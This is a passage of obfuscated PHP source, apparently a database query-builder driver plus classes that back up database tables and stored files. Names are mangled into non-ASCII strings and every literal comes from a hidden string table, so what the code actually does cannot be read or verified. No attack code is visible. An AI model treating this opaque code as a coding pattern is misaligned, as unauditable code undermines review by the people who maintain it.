$this->exp[$•¼…„ƒÃ] . $Ñ Á§®ô[1003] . $¸«¸‡„› . $Ñ Á§®ô[1005]; } } elseif (preg_match($Ñ Á§®ô[1124], $üÎùõŒ€[0])) { $Œ©èĞ–Ø = is_string($üÎùõŒ€[1]) ? explode($Ñ Á§®ô[50], $üÎùõŒ€[1]) : $üÎùõŒ€[1]; $Â«”©„£ .= $Ñ Á§®ô[1003] . $‰©×›®² . $Ñ Á§®ô[53] . $this->exp[$•¼…„ƒÃ] . $Ñ Á§®ô[53] . $this->parseValue($Œ©èĞ–Ø[0]) . $Ñ Á§®ô[1107] . $this->parseValue($Œ©èĞ–Ø[1]) . $Ñ Á§®ô[357]; } else { think_exception(think_lang($Ñ Á§®ô[1110]) . $Ñ Á§®ô[4] . $üÎùõŒ€[0]); } } else { $Áãï—á· = count($üÎùõŒ€); $Ÿ©Æ’²œ = $Ñ Á§®ô[12]; if (is_string($üÎùõŒ€[$Áãï—á· - 1])) { $Ÿ©Æ’²œ = isset($üÎùõŒ€[$Áãï—á· - 1]) ? strtoupper($üÎùõŒ€[$Áãï—á· - 1]) : $Ñ Á§®ô[12]; if (in_array($Ÿ©Æ’²œ, array($Ñ Á§®ô[1104], $Ñ Á§®ô[1105], $Ñ Á§®ô[1106]))) { $Áãï—á· = $Áãï—á· - 1; } } else { $Ÿ©Æ’²œ = $Ñ Á§®ô[1104]; } for ($Ê—ÒÂ„È = 0; $Ê—ÒÂ„È < $Áãï—á·; $Ê—ÒÂ„È++) { $Œ©èĞ–Ø = is_array($üÎùõŒ€[$Ê—ÒÂ„È]) ? $üÎùõŒ€[$Ê—ÒÂ„È][1] : $üÎùõŒ€[$Ê—ÒÂ„È]; if ($Ñ Á§®ô[373] == strtolower($üÎùõŒ€[$Ê—ÒÂ„È][0])) { $Â«”©„£ .= $Ñ Á§®ô[338] . $‰©×›®² . $Ñ Á§®ô[53] . $Œ©èĞ–Ø . $Ñ Á§®ô[1121] . $Ÿ©Æ’²œ . $Ñ Á§®ô[53]; } else { $ºùšÃ¨î = is_array($üÎùõŒ€[$Ê—ÒÂ„È]) ? $this->exp[strtolower($üÎùõŒ€[$Ê—ÒÂ„È][0])] : $Ñ Á§®ô[464]; if (!$ºùšÃ¨î && is_array($üÎùõŒ€[$Ê—ÒÂ„È]) && in_array($üÎùõŒ€[$Ê—ÒÂ„È][0], array($Ñ Á§®ô[464], $Ñ Á§®ô[1114], $Ñ Á§®ô[1115], $Ñ Á§®ô[1116], $Ñ Á§®ô[1117], $Ñ Á§®ô[1118]))) { $ºùšÃ¨î = $üÎùõŒ€[$Ê—ÒÂ„È][0]; } $Â«”©„£ .= $Ñ Á§®ô[338] . $‰©×›®² . $Ñ Á§®ô[53] . $ºùšÃ¨î . $Ñ Á§®ô[53] . $this->parseValue($Œ©èĞ–Ø) . $Ñ Á§®ô[1121] . $Ÿ©Æ’²œ . $Ñ Á§®ô[53]; } } $Â«”©„£ = substr($Â«”©„£, 0, -4); } } else { $Â«”©„£ .= $‰©×›®² . $Ñ Á§®ô[1125] . $this->parseValue($üÎùõŒ€); } return $Â«”©„£; } protected function parseThinkWhere($ÈŸ«ß‘ , $ˆ¦ò³ñì) { $ÙÑ¹¨øŒ =& $_SERVER[¿ÈˆÑ¸ä]; $¿Ğûû™ = $ÙÑ¹¨øŒ[12]; switch ($ÈŸ«ß‘ ) { case $ÙÑ¹¨øŒ[428]: $¿Ğûû™ = $ˆ¦ò³ñì; break; case $ÙÑ¹¨øŒ[1108]: $¿Ğûû™ = is_string($ˆ¦ò³ñì) ? $ˆ¦ò³ñì : substr($this->parseWhere($ˆ¦ò³ñì), 6); break; case $ÙÑ¹¨øŒ[1126]: parse_str($ˆ¦ò³ñì, $¨Ï®Ô…ß); if (isset($¨Ï®Ô…ß[$ÙÑ¹¨øŒ[1103]])) { $­—èŸçÏ = $ÙÑ¹¨øŒ[53] . strtoupper($¨Ï®Ô…ß[$ÙÑ¹¨øŒ[1103]]) . $ÙÑ¹¨øŒ[53]; unset($¨Ï®Ô…ß[$ÙÑ¹¨øŒ[1103]]); } else { $­—èŸçÏ = $ÙÑ¹¨øŒ[1107]; } $•ŠñÈç = array(); foreach ($¨Ï®Ô…ß as $º©ÎãÓ => $°¯Û›Äó) { $•ŠñÈç[] = $this->parseKey($º©ÎãÓ) . $ÙÑ¹¨øŒ[1125] . $this->parseValue($°¯Û›Äó); } $¿Ğûû™ = implode($­—èŸçÏ, $•ŠñÈç); break; } return $¿Ğûû™; } protected function parseLimit($ĞæÉ©£) { $ààîÇ¡ï =& $_SERVER[¿ÈˆÑ¸ä]; return !empty($ĞæÉ©£) ? $ààîÇ¡ï[51] . $ĞæÉ©£ . $ààîÇ¡ï[53] : $ààîÇ¡ï[12]; } protected function parseJoin($£óßîúô) { $‘…ËÙô =& $_SERVER[¿ÈˆÑ¸ä]; $‘µÏ˜Ëì = $‘…ËÙô[12]; if (!empty($£óßîúô)) { if (is_array($£óßîúô)) { foreach ($£óßîúô as $º„õÚ‚° => $´ùƒğ…) { if (!1 !== stripos($´ùƒğ…, $‘…ËÙô[1127])) { $‘µÏ˜Ëì .= $‘…ËÙô[53] . $´ùƒğ…; } else { $‘µÏ˜Ëì .= $‘…ËÙô[1128] . $´ùƒğ…; } } } else { $‘µÏ˜Ëì .= $‘…ËÙô[1128] . $£óßîúô; } } $‘µÏ˜Ëì = preg_replace($‘…ËÙô[1129], think_config($‘…ËÙô[1033]) . $‘…ËÙô[1130], $‘µÏ˜Ëì); return $‘µÏ˜Ëì; } protected function parseOrder($ü¬ƒ¤ãà) { $º²µ·‹ =& $_SERVER[¿ÈˆÑ¸ä]; if (is_array($ü¬ƒ¤ãà)) { $îï†…Ã = array(); foreach ($ü¬ƒ¤ãà as $‘©İ³ó => $ÄÂ¦ï…º) { if (is_numeric($‘©İ³ó)) { $îï†…Ã[] = $this->parseKey($ÄÂ¦ï…º); } else { $ÄÂ¦ï…º = in_array(strtoupper(trim($ÄÂ¦ï…º)), array($º²µ·‹[1131], $º²µ·‹[1132])) ? $º²µ·‹[53] . $ÄÂ¦ï…º : $º²µ·‹[12]; if (preg_match($º²µ·‹[1133], $‘©İ³ó)) { $îï†…Ã[] = $this->parseKey($‘©İ³ó) . $ÄÂ¦ï…º; } else { think_exception($º²µ·‹[1134] . $‘©İ³ó); } } } $ü¬ƒ¤ãà = implode($º²µ·‹[50], $îï†…Ã); } return !empty($ü¬ƒ¤ãà) ? $º²µ·‹[1135] . $ü¬ƒ¤ãà : $º²µ·‹[12]; } protected function parseGroup($…Ü«ı™æ) { $èØ™ÇÙÓ =& $_SERVER[¿ÈˆÑ¸ä]; return !empty($…Ü«ı™æ) ? $èØ™ÇÙÓ[1136] . $…Ü«ı™æ : $èØ™ÇÙÓ[12]; } protected function parseHaving($ÓîÃœäé) { $È ¡‰£ =& $_SERVER[¿ÈˆÑ¸ä]; return !empty($ÓîÃœäé) ? $È ¡‰£[1137] . $ÓîÃœäé : $È ¡‰£[12]; } protected function parseComment($ÜÜÔû§è) { $´ñ‘õÅ¾ =& $_SERVER[¿ÈˆÑ¸ä]; return !empty($ÜÜÔû§è) ? $´ñ‘õÅ¾[1138] . $ÜÜÔû§è . $´ñ‘õÅ¾[1139] : $´ñ‘õÅ¾[12]; } protected function parseDistinct($»âÊË‹¤) { $Œ ¬à¼¢ =& $_SERVER[¿ÈˆÑ¸ä]; return !empty($»âÊË‹¤) ? $Œ ¬à¼¢[1140] : $Œ ¬à¼¢[12]; } protected function parseUnion($Ïà½ÂµÉ) { $»ÕÔ¥°â =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($Ïà½ÂµÉ)) { return $»ÕÔ¥°â[12]; } if (isset($Ïà½ÂµÉ[$»ÕÔ¥°â[424]])) { $ÙÔÖ¥™ç = $»ÕÔ¥°â[1141]; unset($Ïà½ÂµÉ[$»ÕÔ¥°â[424]]); } else { $ÙÔÖ¥™ç = $»ÕÔ¥°â[1142]; } foreach ($Ïà½ÂµÉ as $ĞÇ­ƒ„§) { $ĞúŞü—è[] = $ÙÔÖ¥™ç . (is_array($ĞÇ­ƒ„§) ? $this->buildSelectSql($ĞÇ­ƒ„§) : $ĞÇ­ƒ„§); } return implode($»ÕÔ¥°â[53], $ĞúŞü—è); } public function insert($¹ÕÊã, $Æ±­æ½¤ = array(), $’¡Øáé¹ = false) { $ƒ™Äİ– =& $_SERVER[¿ÈˆÑ¸ä]; $¹ªØ’—Ä = $Àêğ¸óˆ = array(); $this->model = $Æ±­æ½¤[$ƒ™Äİ–[360]]; foreach ($¹ÕÊã as $òË˜®†™ => $ŞšõŞ«ß) { if (is_array($ŞšõŞ«ß) && $ƒ™Äİ–[373] == $ŞšõŞ«ß[0]) { $Àêğ¸óˆ[] = $this->parseKey($òË˜®†™); $¹ªØ’—Ä[] = $ŞšõŞ«ß[1]; } elseif (is_scalar($ŞšõŞ«ß) || is_null($ŞšõŞ«ß)) { $Àêğ¸óˆ[] = $this->parseKey($òË˜®†™); $¹ªØ’—Ä[] = $this->parseValue($ŞšõŞ«ß); } } $»ßéµ—Û = ($’¡Øáé¹ ? $ƒ™Äİ–[1007] : $ƒ™Äİ–[1008]) . $ƒ™Äİ–[1009] . $this->parseTable($Æ±­æ½¤[$ƒ™Äİ–[358]]) . $ƒ™Äİ–[1003] . implode($ƒ™Äİ–[50], $Àêğ¸óˆ) . $ƒ™Äİ–[1004] . implode($ƒ™Äİ–[50], $¹ªØ’—Ä) . $ƒ™Äİ–[1005]; $»ßéµ—Û .= $this->parseLock(isset($Æ±­æ½¤[$ƒ™Äİ–[938]]) ? $Æ±­æ½¤[$ƒ™Äİ–[938]] : !1); $»ßéµ—Û .= $this->parseComment(!empty($Æ±­æ½¤[$ƒ™Äİ–[430]]) ? $Æ±­æ½¤[$ƒ™Äİ–[430]] : $ƒ™Äİ–[12]); return $this->execute($»ßéµ—Û, $this->parseBind(!empty($Æ±­æ½¤[$ƒ™Äİ–[362]]) ? $Æ±­æ½¤[$ƒ™Äİ–[362]] : array())); } public function selectInsert($ëş½ŒµÄ, $ÔÃ”Ø, $—Ã·æƒœ = array()) { $×Š°ïàÕ =& $_SERVER[¿ÈˆÑ¸ä]; $this->model = $—Ã·æƒœ[$×Š°ïàÕ[360]]; if (is_string($ëş½ŒµÄ)) { $ëş½ŒµÄ = explode($×Š°ïàÕ[50], $ëş½ŒµÄ); } array_walk($ëş½ŒµÄ, array($this, $×Š°ïàÕ[1006])); $ôƒÙÇê = $×Š°ïàÕ[1143] . $this->parseTable($ÔÃ”Ø) . $×Š°ïàÕ[1003] . implode($×Š°ïàÕ[50], $ëş½ŒµÄ) . $×Š°ïàÕ[1121]; $ôƒÙÇê .= $this->buildSelectSql($—Ã·æƒœ); return $this->execute($ôƒÙÇê, $this->parseBind(!empty($—Ã·æƒœ[$×Š°ïàÕ[362]]) ? $—Ã·æƒœ[$×Š°ïàÕ[362]] : array())); } public function update($±«ƒ¸¯, $ÓÂä×Ê‹) { $ÔØ±¹úÉ =& $_SERVER[¿ÈˆÑ¸ä]; $this->model = $ÓÂä×Ê‹[$ÔØ±¹úÉ[360]]; $÷µ€ü‹µ = $ÔØ±¹úÉ[1144] . $this->parseTable($ÓÂä×Ê‹[$ÔØ±¹úÉ[358]]) . $this->parseSet($±«ƒ¸¯) . $this->parseWhere(!empty($ÓÂä×Ê‹[$ÔØ±¹úÉ[354]]) ? $ÓÂä×Ê‹[$ÔØ±¹úÉ[354]] : $ÔØ±¹úÉ[12]) . $this->parseOrder(!empty($ÓÂä×Ê‹[$ÔØ±¹úÉ[442]]) ? $ÓÂä×Ê‹[$ÔØ±¹úÉ[442]] : $ÔØ±¹úÉ[12]) . $this->parseLimit(!empty($ÓÂä×Ê‹[$ÔØ±¹úÉ[369]]) ? $ÓÂä×Ê‹[$ÔØ±¹úÉ[369]] : $ÔØ±¹úÉ[12]) . $this->parseLock(isset($ÓÂä×Ê‹[$ÔØ±¹úÉ[938]]) ? $ÓÂä×Ê‹[$ÔØ±¹úÉ[938]] : !1) . $this->parseComment(!empty($ÓÂä×Ê‹[$ÔØ±¹úÉ[430]]) ? $ÓÂä×Ê‹[$ÔØ±¹úÉ[430]] : $ÔØ±¹úÉ[12]); return $this->execute($÷µ€ü‹µ, $this->parseBind(!empty($ÓÂä×Ê‹[$ÔØ±¹úÉ[362]]) ? $ÓÂä×Ê‹[$ÔØ±¹úÉ[362]] : array())); } public function delete($Ç¤óşøö = array()) { $ÑĞù =& $_SERVER[¿ÈˆÑ¸ä]; $this->model = $Ç¤óşøö[$ÑĞù[360]]; $ƒ›²¼Ã» = $ÑĞù[1145] . $this->parseTable($Ç¤óşøö[$ÑĞù[358]]) . $this->parseWhere(!empty($Ç¤óşøö[$ÑĞù[354]]) ? $Ç¤óşøö[$ÑĞù[354]] : $ÑĞù[12]) . $this->parseOrder(!empty($Ç¤óşøö[$ÑĞù[442]]) ? $Ç¤óşøö[$ÑĞù[442]] : $ÑĞù[12]) . $this->parseLimit(!empty($Ç¤óşøö[$ÑĞù[369]]) ? $Ç¤óşøö[$ÑĞù[369]] : $ÑĞù[12]) . $this->parseLock(isset($Ç¤óşøö[$ÑĞù[938]]) ? $Ç¤óşøö[$ÑĞù[938]] : !1) . $this->parseComment(!empty($Ç¤óşøö[$ÑĞù[430]]) ? $Ç¤óşøö[$ÑĞù[430]] : $ÑĞù[12]); return $this->execute($ƒ›²¼Ã», $this->parseBind(!empty($Ç¤óşøö[$ÑĞù[362]]) ? $Ç¤óşøö[$ÑĞù[362]] : array())); } public function select($¿şÖó×Í = array()) { $ºµá«Ì” =& $_SERVER[¿ÈˆÑ¸ä]; $this->model = $¿şÖó×Í[$ºµá«Ì”[360]]; $Ş·Èï®² = $this->buildSelectSql($¿şÖó×Í); $ñŠš…“¢ = isset($¿şÖó×Í[$ºµá«Ì”[425]]) ? $¿şÖó×Í[$ºµá«Ì”[425]] : !1; if ($ñŠš…“¢) { $“×•éùÈ = is_string($ñŠš…“¢[$ºµá«Ì”[95]]) ? $ñŠš…“¢[$ºµá«Ì”[95]] : $ºµá«Ì”[1146] . md5($Ş·Èï®²); $³ š£ø£ = think_cache($“×•éùÈ, $ºµá«Ì”[12], $ñŠš…“¢); if (!1 !== $³ š£ø£) { return $³ š£ø£; } } $û©â½Øš = $this->query($Ş·Èï®², $this->parseBind(!empty($¿şÖó×Í[$ºµá«Ì”[362]]) ? $¿şÖó×Í[$ºµá«Ì”[362]] : array())); if ($ñŠš…“¢ && !1 !== $û©â½Øš) { think_cache($“×•éùÈ, $û©â½Øš, $ñŠš…“¢); } return $û©â½Øš; } public function buildSelectSql($ğÃÇÚ³ = array()) { $û¼ªú² =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($ğÃÇÚ³[$û¼ªú²[429]])) { if (strpos($ğÃÇÚ³[$û¼ªú²[429]], $û¼ªú²[50])) { list($üë™–ÑÂ, $”²Òš) = explode($û¼ªú²[50], $ğÃÇÚ³[$û¼ªú²[429]]); } else { $üë™–ÑÂ = $ğÃÇÚ³[$û¼ªú²[429]]; } $üë™–ÑÂ = $üë™–ÑÂ ? $üë™–ÑÂ : 1; $”²Òš = isset($”²Òš) ? $”²Òš : (is_numeric($ğÃÇÚ³[$û¼ªú²[369]]) ? $ğÃÇÚ³[$û¼ªú²[369]] : 20); $äí°ó»Û = $”²Òš * ((int) $üë™–ÑÂ - 1); $ğÃÇÚ³[$û¼ªú²[369]] = $äí°ó»Û . $û¼ªú²[50] . $”²Òš; } if (think_config($û¼ªú²[1147])) { $‡€•ï† = $û¼ªú²[1148] . md5(serialize($ğÃÇÚ³)); $ˆ¡âÒƒÍ = think_cache($‡€•ï†); if ($ˆ¡âÒƒÍ) { return $ˆ¡âÒƒÍ; } } $ï»›ö¡ = $this->parseSql($this->selectSql, $ğÃÇÚ³); $ï»›ö¡ .= $this->parseLock(isset($ğÃÇÚ³[$û¼ªú²[938]]) ? $ğÃÇÚ³[$û¼ªú²[938]] : !1); if (isset($‡€•ï†)) { think_cache($‡€•ï†, $ï»›ö¡); } return $ï»›ö¡; } public function parseSql($ß»ìè°, $¼×¼ÑŞ = array()) { $ë‰ğâ—… =& $_SERVER[¿ÈˆÑ¸ä]; $ß»ìè° = str_replace(array($ë‰ğâ—…[1149], $ë‰ğâ—…[1150], $ë‰ğâ—…[1151], $ë‰ğâ—…[1152], $ë‰ğâ—…[1153], $ë‰ğâ—…[1154], $ë‰ğâ—…[1155], $ë‰ğâ—…[1156], $ë‰ğâ—…[1157], $ë‰ğâ—…[1158], $ë‰ğâ—…[1159]), array($this->parseTable("{$¼×¼ÑŞ[$ë‰ğâ—…[358]]}"), $this->parseDistinct(isset($¼×¼ÑŞ[$ë‰ğâ—…[1160]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[1160]] : !1), $this->parseField(!empty($¼×¼ÑŞ[$ë‰ğâ—…[352]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[352]] : $ë‰ğâ—…[221]), $this->parseJoin(!empty($¼×¼ÑŞ[$ë‰ğâ—…[361]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[361]] : $ë‰ğâ—…[12]), $this->parseWhere(!empty($¼×¼ÑŞ[$ë‰ğâ—…[354]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[354]] : $ë‰ğâ—…[12]), $this->parseGroup(!empty($¼×¼ÑŞ[$ë‰ğâ—…[594]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[594]] : $ë‰ğâ—…[12]), $this->parseHaving(!empty($¼×¼ÑŞ[$ë‰ğâ—…[1161]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[1161]] : $ë‰ğâ—…[12]), $this->parseOrder(!empty($¼×¼ÑŞ[$ë‰ğâ—…[442]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[442]] : $ë‰ğâ—…[12]), $this->parseLimit(!empty($¼×¼ÑŞ[$ë‰ğâ—…[369]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[369]] : $ë‰ğâ—…[12]), $this->parseUnion(!empty($¼×¼ÑŞ[$ë‰ğâ—…[423]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[423]] : $ë‰ğâ—…[12]), $this->parseComment(!empty($¼×¼ÑŞ[$ë‰ğâ—…[430]]) ? $¼×¼ÑŞ[$ë‰ğâ—…[430]] : $ë‰ğâ—…[12])), $ß»ìè°); return $ß»ìè°; } public function getLastSql($¥Ú¬¤€ = '') { return $¥Ú¬¤€ ? $this->modelSql[$¥Ú¬¤€] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ô…Ö‹•´) { return addslashes($ô…Ö‹•´); } public function setModel($ªÃÁ²Ø) { $this->model = $ªÃÁ²Ø; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto f…»ò„Ò…‹; F»í¿ÈˆÕğ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $şŞ†ñÏ =& $_SERVER[¿ÈˆÑ¸ä]; $çí™ñ = Backup::get(); self::$io = $çí™ñ[$şŞ†ñÏ[835]]; self::$name = $çí™ñ[$şŞ†ñÏ[32]]; $…®®·” = new DbManage(); $ûñ•ìú = $…®®·”->dbType(); $Ø«ªØÀ¼ = array($şŞ†ñÏ[864] => $ûñ•ìú, $şŞ†ñÏ[865] => time()); Backup::set($Ø«ªØÀ¼); $Á­±Ò»â = $this->tmpFilesPath() . $şŞ†ñÏ[866] . self::$name . $şŞ†ñÏ[8]; del_dir($Á­±Ò»â); mk_dir($Á­±Ò»â); $ùŞÀ“ÒÍ = $ÌÆÒÁ® = 0; try { $¬ûÃñ = $…®®·”->db()->getTables(); } catch (Exception $šÌ©§é×) { Backup::log($şŞ†ñÏ[867] . $šÌ©§é×->getMessage()); return !1; } $¬ûÃñ = array_diff($¬ûÃñ, array($şŞ†ñÏ[868], $şŞ†ñÏ[869])); foreach ($¬ûÃñ as $£œ÷Ë£) { if ($£œ÷Ë£ == $şŞ†ñÏ[870]) { continue; } $ùŞÀ“ÒÍ += $…®®·”->model($£œ÷Ë£)->count(); } $’’ºœµÌ = new Task($şŞ†ñÏ[871], $şŞ†ñÏ[863], $ùŞÀ“ÒÍ, LNG($şŞ†ñÏ[872]) . $şŞ†ñÏ[873] . LNG($şŞ†ñÏ[874])); $GLOBALS[$şŞ†ñÏ[875]] = self::$name; foreach ($¬ûÃñ as $£œ÷Ë£) { $û¿Ş†‡‰ = $Á­±Ò»â . $£œ÷Ë£ . $şŞ†ñÏ[876]; if ($£œ÷Ë£ == $şŞ†ñÏ[870]) { @touch($û¿Ş†‡‰); continue; } $ ¤‚¬¤ä = null; if ($£œ÷Ë£ == $şŞ†ñÏ[877] && $çí™ñ[$şŞ†ñÏ[169]] == $şŞ†ñÏ[862]) { $ ¤‚¬¤ä = self::$io; } $ÌÆÒÁ® += $…®®·”->sqlFromDb($£œ÷Ë£, $û¿Ş†‡‰, $’’ºœµÌ, $ ¤‚¬¤ä); } unset($GLOBALS[$şŞ†ñÏ[875]]); $’’ºœµÌ->end(); if ($ÌÆÒÁ® > $ùŞÀ“ÒÍ) { $ùŞÀ“ÒÍ = $ÌÆÒÁ®; } $Ø«ªØÀ¼ = array($şŞ†ñÏ[864] => $ûñ•ìú, $şŞ†ñÏ[859] => 1, $şŞ†ñÏ[878] => $ùŞÀ“ÒÍ, $şŞ†ñÏ[879] => $ÌÆÒÁ®, $şŞ†ñÏ[880] => time()); Backup::set($Ø«ªØÀ¼); if ($ùŞÀ“ÒÍ - $ÌÆÒÁ® > 0) { $ã®Ÿ†¶â = $şŞ†ñÏ[881]; if (!stristr(I18n::getType(), $şŞ†ñÏ[882])) { $ã®Ÿ†¶â = $şŞ†ñÏ[883]; } Backup::log(array($ã®Ÿ†¶â, $Ø«ªØÀ¼)); return !1; } return !0; } private function tmpFilesPath() { $ÆËõÜ‚ş =& $_SERVER[¿ÈˆÑ¸ä]; $Ğ°èí·­ = TEMP_FILES; if ($GLOBALS[$ÆËõÜ‚ş[6]][$ÆËõÜ‚ş[92]][$ÆËõÜ‚ş[884]]) { $Ğ°èí·­ = $GLOBALS[$ÆËõÜ‚ş[6]][$ÆËõÜ‚ş[92]][$ÆËõÜ‚ş[884]]; if (!mk_dir($Ğ°èí·­) || !is_writable($Ğ°èí·­) || !IO::mkfile($Ğ°èí·­ . $ÆËõÜ‚ş[885])) { $Ğ°èí·­ = TEMP_FILES; } } return $Ğ°èí·­; } } class BackupDbFile { public function __construct() { } public function index() { $ÂöÈ·± =& $_SERVER[¿ÈˆÑ¸ä]; $§êö´¿ = Backup::get(); $¤Š ÏÎ = $§êö´¿[$ÂöÈ·±[32]]; $Í’™³ğş = $this->tmpFilesPath() . "\142\x61\143\153\x75\x70\x5f{$¤Š ÏÎ}\x2f"; $ƒŸÜŠµĞ = $this->backupPath($§êö´¿); if (!($ƒŸÜŠµĞ = IO::mkdir($ƒŸÜŠµĞ))) { Backup::log($ÂöÈ·±[886] . $ƒŸÜŠµĞ); return !1; } $ú­ÆŸ«ş = new DbManage(); $´œ¹ÈÙ¢ = $ú­ÆŸ«ş->getSqlFile(); if (!$´œ¹ÈÙ¢ || !$´œ¹ÈÙ¢[$ÂöÈ·±[887]] || !$´œ¹ÈÙ¢[$ÂöÈ·±[13]]) { Backup::log($ÂöÈ·±[888]); return !1; } IO::move($´œ¹ÈÙ¢[$ÂöÈ·±[887]], $Í’™³ğş); IO::move($´œ¹ÈÙ¢[$ÂöÈ·±[13]], $Í’™³ğş); $ú­ÆŸ«ş->mixBakList($Í’™³ğş); $£à§êÀ† = IO::listPath($Í’™³ğş); $„¤Ø×Ö  = isset($£à§êÀ†[$ÂöÈ·±[86]]) ? $£à§êÀ†[$ÂöÈ·±[86]] : array(); $Ô™ÊœÔö = array_sum(array_column($„¤Ø×Ö , $ÂöÈ·±[79])); if (!$Ô™ÊœÔö) { Backup::log($ÂöÈ·±[889] . $Í’™³ğş); return !1; } $„ô­¯İ› = array($ÂöÈ·±[890] => $Ô™ÊœÔö, $ÂöÈ·±[891] => time()); Backup::set($„ô­¯İ›); Hook::trigger($ÂöÈ·±[892], $Í’™³ğş, $ƒŸÜŠµĞ); $Ì×Ë”ë¿ = new TaskFileTransfer($ÂöÈ·±[892], $ÂöÈ·±[863], count($„¤Ø×Ö ), LNG($ÂöÈ·±[872]) . $ÂöÈ·±[473] . LNG($ÂöÈ·±[874]) . $ÂöÈ·±[893]); $Ì×Ë”ë¿->task[$ÂöÈ·±[847]] = $Ô™ÊœÔö; foreach ($£à§êÀ†[$ÂöÈ·±[86]] as $×½˜”) { $Â­·íË  = IO::move($×½˜”[$ÂöÈ·±[87]], $ƒŸÜŠµĞ); if (!$Â­·íË ) { $Ì×Ë”ë¿->end(); $´³Ç×¤Ş = IO::getLastError($ÂöÈ·±[894] . $×½˜”[$ÂöÈ·±[87]] . $ÂöÈ·±[895] . $ƒŸÜŠµĞ . $ÂöÈ·±[176]); Backup::log($´³Ç×¤Ş); return !1; } } $Ì×Ë”ë¿->end(); $„ô­¯İ› = array($ÂöÈ·±[896] => $Ô™ÊœÔö, $ÂöÈ·±[897] => time()); Backup::set($„ô­¯İ›); return !0; } private function backupPath($Ä¼×«ÛÉ) { $íƒò®÷â =& $_SERVER[¿ÈˆÑ¸ä]; $†æ•Ò¾­ = $Ä¼×«ÛÉ[$íƒò®÷â[32]]; $Á°ÉŸ÷ = Model($íƒò®÷â[856])->get($íƒò®÷â[857]); $ ïüŸ§ = substr(md5($íƒò®÷â[858] . $Á°ÉŸ÷ . $†æ•Ò¾­), 0, 8); return "\x7b\151\x6f\x3a{$Ä¼×«ÛÉ[$íƒò®÷â[835]]}\x7d\57\x64\141\164\x61\142\141\x73\145\57\x62\141\x63\153\x75\x70\57" . $†æ•Ò¾­ . $íƒò®÷â[11] . $ ïüŸ§; } private function tmpFilesPath() { $Îö¸Êßí =& $_SERVER[¿ÈˆÑ¸ä]; $…ÉÀ±ºÎ = TEMP_FILES; if ($GLOBALS[$Îö¸Êßí[6]][$Îö¸Êßí[92]][$Îö¸Êßí[884]]) { $…ÉÀ±ºÎ = $GLOBALS[$Îö¸Êßí[6]][$Îö¸Êßí[92]][$Îö¸Êßí[884]]; if (!mk_dir($…ÉÀ±ºÎ) || !is_writable($…ÉÀ±ºÎ) || !IO::mkfile($…ÉÀ±ºÎ . $Îö¸Êßí[885])) { $…ÉÀ±ºÎ = TEMP_FILES; } } return $…ÉÀ±ºÎ; } } class BackupFile { public function __construct() { } public function index() { $œíÁü€È = Backup::get(); $¤ÇäªÓÑ = $œíÁü€È[$_SERVER[¿ÈˆÑ¸ä][839]][$_SERVER[¿ÈˆÑ¸ä][231]][$_SERVER[¿ÈˆÑ¸ä][553]]; $ˆşíÎÄ± = array($_SERVER[¿ÈˆÑ¸ä][554] => array($_SERVER[¿ÈˆÑ¸ä][898], $¤ÇäªÓÑ), $_SERVER[¿ÈˆÑ¸ä][899] => array($_SERVER[¿ÈˆÑ¸ä][407], $œíÁü€È[$_SERVER[¿ÈˆÑ¸ä][835]])); $êõæ½Ÿœ = (int) Model($_SERVER[¿ÈˆÑ¸ä][877])->where($ˆşíÎÄ±)->count($_SERVER[¿ÈˆÑ¸ä][553]); $Ì¾§ƒÌò = (int) Model($_SERVER[¿ÈˆÑ¸ä][877])->where($ˆşíÎÄ±)->sum($_SERVER[¿ÈˆÑ¸ä][79]); $±¯İ¡Ëê = new TaskFileTransfer($_SERVER[¿ÈˆÑ¸ä][900], $_SERVER[¿ÈˆÑ¸ä][863], $êõæ½Ÿœ, LNG($_SERVER[¿ÈˆÑ¸ä][872]) . $_SERVER[¿ÈˆÑ¸ä][873] . LNG($_SERVER[¿ÈˆÑ¸ä][901])); $±¯İ¡Ëê->task[$_SERVER[¿ÈˆÑ¸ä][847]] = $Ì¾§ƒÌò; $®ÎÕ¥ = array($_SERVER[¿ÈˆÑ¸ä][902] => $êõæ½Ÿœ, $_SERVER[¿ÈˆÑ¸ä][903] => $Ì¾§ƒÌò, $_SERVER[¿ÈˆÑ¸ä][904] => time()); Backup::set($®ÎÕ¥); $¡Ç×Éİ½ = !0; $¿±üŒßù = $this->storeIds(); $ôãóğ€ë = 1; $½ªÍàì® = 1000; $¾Ç˜­­á = $¿Ôâ×óè = 0; $Õƒ‹²î = array(); $°¦³åå” = $Õ‹‰Â½ = 0; do { $ø‰ùòéÛ = $_SERVER[¿ÈˆÑ¸ä][905]; $Ş©¼¼—˜ = Model($_SERVER[¿ÈˆÑ¸ä][877])->where($ˆşíÎÄ±)->field($ø‰ùòéÛ)->order($_SERVER[¿ÈˆÑ¸ä][906])->selectPage($½ªÍàì®, $ôãóğ€ë); $±ôÌ¦ë = !empty($Ş©¼¼—˜[$_SERVER[¿ÈˆÑ¸ä][446]]) ? $Ş©¼¼—˜[$_SERVER[¿ÈˆÑ¸ä][446]] : array(); foreach ($±ôÌ¦ë as $ó…ÎàÁ¤) { if (!$this->_fileExist($ó…ÎàÁ¤, $Õƒ‹²î, $¿±üŒßù)) { Backup::log($_SERVER[¿ÈˆÑ¸ä][907] . $ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][553]] . $_SERVER[¿ÈˆÑ¸ä][908] . $ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][87]]); continue; } $†¸Ëª¤¶ = $ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][87]]; $ø¨½®‚î = "\173\x69\x6f\72{$œíÁü€È[$_SERVER[¿ÈˆÑ¸ä][835]]}\x7d" . substr($†¸Ëª¤¶, 